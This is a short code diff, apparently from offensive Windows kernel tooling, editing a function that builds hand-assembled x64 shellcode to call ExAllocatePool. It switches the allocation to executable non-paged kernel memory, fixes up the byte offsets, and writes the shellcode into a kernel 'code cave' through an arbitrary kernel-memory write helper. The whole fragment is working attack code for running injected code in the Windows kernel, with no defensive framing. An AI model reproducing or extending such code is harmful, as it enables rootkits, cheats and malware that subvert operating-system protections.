@@ -1557,7 +1557,7 @@ ULONG64 KM_AllocateKernelPool(SIZE_T size) {
     unsigned char sc[] = {
         0x53,                                           // push rbx
         0x48, 0x83, 0xEC, 0x20,                        // sub rsp, 0x20
-        0x48, 0x31, 0xC9,                              // xor rcx, rcx  (NonPagedPool)
+        0xB9, 0x00, 0x02, 0x00, 0x00,                  // mov ecx, 0x200 (NonPagedPoolExecute)
         0x48, 0xBA,                                     // mov rdx, imm64 (size)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x49, 0xB8,                                     // mov r8, imm64 (tag)
@@ -1574,10 +1574,10 @@ ULONG64 KM_AllocateKernelPool(SIZE_T size) {
         0xC3                                            // ret
     };
 
-    *(ULONG64*)(sc + 10) = (ULONG64)size;
-    *(ULONG64*)(sc + 20) = (ULONG64)0x6B63614D;
-    *(ULONG64*)(sc + 30) = (ULONG64)pExAllocatePool;
-    *(ULONG64*)(sc + 42) = resultAddr;
+    *(ULONG64*)(sc + 12) = (ULONG64)size;
+    *(ULONG64*)(sc + 22) = (ULONG64)0x6B63614D;
+    *(ULONG64*)(sc + 32) = (ULONG64)pExAllocatePool;
+    *(ULONG64*)(sc + 44) = resultAddr;
 
     KM_WriteKernelMemory(codeCave, sc, sizeof(sc));
 
